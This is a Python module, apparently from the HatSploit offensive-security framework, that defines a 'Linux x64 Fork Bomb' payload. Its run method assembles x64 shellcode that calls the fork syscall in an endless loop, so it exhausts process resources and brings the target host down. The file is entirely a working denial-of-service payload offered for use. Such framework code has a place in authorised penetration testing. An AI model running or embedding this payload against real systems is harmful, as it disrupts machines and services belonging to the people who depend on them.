"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.payload import Payload
from pex.assembler import Assembler


class HatSploitPayload(Payload, Assembler):
    def __init__(self):
        super().__init__()

        self.details = {
            'Name': "Linux x64 Fork Bomb",
            'Payload': "linux/x64/fork_bomb",
            'Authors': [
                'Ivan Nikolsky (enty8080) - payload developer',
            ],
            'Description': "Fork bomb payload for Linux x64.",
            'Architecture': "x64",
            'Platform': "linux",
            'Rank': "low",
            'Type': "one_side",
        }

    def run(self):
        return self.assemble(
            self.details['Architecture'],
            """
            start:
                push 0x39
                pop rax
                syscall
                jmp start
            """,
        )
